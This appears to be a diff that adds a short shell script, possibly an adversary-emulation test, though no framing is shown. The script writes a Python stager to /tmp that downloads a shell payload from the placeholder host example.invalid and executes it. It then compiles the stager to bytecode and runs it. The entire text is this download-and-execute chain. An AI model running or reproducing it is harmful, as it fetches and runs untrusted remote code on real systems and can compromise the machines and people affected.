@@ -1,0 +1,8 @@
+runtime=$(command -v python3)
+echo 'import requests' > /tmp/atomic-stage.py
+echo 'import os' >> /tmp/atomic-stage.py
+echo 'response = requests.get("https://example.invalid/atomic-payload.sh")' >> /tmp/atomic-stage.py
+echo 'open("/tmp/atomic-payload.sh", "wb").write(response.content)' >> /tmp/atomic-stage.py
+echo 'os.system("sh /tmp/atomic-payload.sh")' >> /tmp/atomic-stage.py
+$runtime -c 'import py_compile; py_compile.compile("/tmp/atomic-stage.py", "/tmp/atomic-stage.pyc")'
+$runtime /tmp/atomic-stage.pyc
